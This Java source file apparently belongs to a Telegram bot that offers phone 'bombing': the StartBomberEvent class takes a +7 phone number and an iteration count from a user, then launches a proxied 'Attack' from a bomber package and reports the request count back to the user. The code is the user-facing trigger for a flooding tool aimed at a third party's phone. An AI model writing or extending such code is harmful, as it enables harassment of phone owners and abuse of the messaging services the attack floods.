package com.example.webapp.telegram.actions.events;

import com.example.webapp.telegram.Bot;
import com.example.webapp.telegram.actions.handles.run.RunEditMessageHandler;
import com.example.webapp.telegram.bomber.Attack;
import com.example.webapp.telegram.bomber.Callback;
import com.example.webapp.telegram.entities.UserEntity;
import com.example.webapp.telegram.generators.MessageGenerator;
import com.example.webapp.telegram.impl.EventImpl;
import com.example.webapp.telegram.parser.ParserStorage;
import com.example.webapp.telegram.query.referral.BomberQuery;
import com.example.webapp.telegram.service.UserService;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.updatingmessages.EditMessageText;
import org.telegram.telegrambots.meta.api.objects.Message;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

public class StartBomberEvent extends EventImpl {
    public StartBomberEvent(String name) {
        super(name);
    }

    @Override
    public void exec(Update update, UserEntity user, String params) {
        String[] paramList = null;
        try {
            paramList = params.split(" ");
        } catch (Exception e)
        {
            new MessageGenerator("Неправильные параметры", user.getId());
            return;
        }

        String number = paramList[0];
        int iterators = 0;

        try {
            iterators = Integer.parseInt(paramList[1]);
        } catch (Exception e)
        {
            new MessageGenerator("Неправильный параметр", user.getId());
            return;
        }
        if (iterators > 50 || iterators < 10)
        {
            new MessageGenerator("Укажите количество итераций от 10 \\- 50", user.getId());
            return;
        }

        if(!number.startsWith("+7"))
        {
            new MessageGenerator("Сообщение должно начинаться с \\+7", user.getId());
            return;
        }

        String result = number.replaceAll("[a-zA-Zа-яА-Я]*", "");

        if(result.toCharArray().length != 12)
        {
            System.out.println(result.toCharArray().length);
            new MessageGenerator("Неправильный номер\\!", user.getId());
            return;
        }

        number = number.replaceAll("\\+7","");
        Message message = sendStartMessage("Ваш запрос обрабатывается", user.getId());

        user.setEvent(null);
        UserService.saveUser(user);

        Attack attack = new Attack(new Callback() {
            @Override
            public void onAttackEnd() {
                System.out.println("Attack start");
            }

            @Override
            public void onAttackStart(int serviceCount, int numberOfCycles) {
                System.out.println("Attack end");
            }

            @Override
            public void onProgressChange(int progress) {
                EditMessageText editMessageText = new EditMessageText();
                editMessageText.setText("Количество запросов : " + progress);
                editMessageText.setChatId(user.getId().toString());
                editMessageText.setMessageId(message.getMessageId());

                new RunEditMessageHandler(editMessageText);


            }
        },"7",number, iterators, ParserStorage.proxies, user, message);

        sendStartMessage(BomberQuery.addAttack(user.getId(), attack), user.getId());

        user.addNumber("+7" + number);
    }

    private Message sendStartMessage(String message, Long Id) {
        message.replaceAll("\\.", "");

        SendMessage sendMessage = new SendMessage();
        sendMessage.setText(message);
        sendMessage.setChatId(Id.toString());
        sendMessage.enableHtml(true);
        sendMessage.enableMarkdownV2(true);

        try {
            return new Bot().execute(sendMessage);
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }
        return null;
    }
}
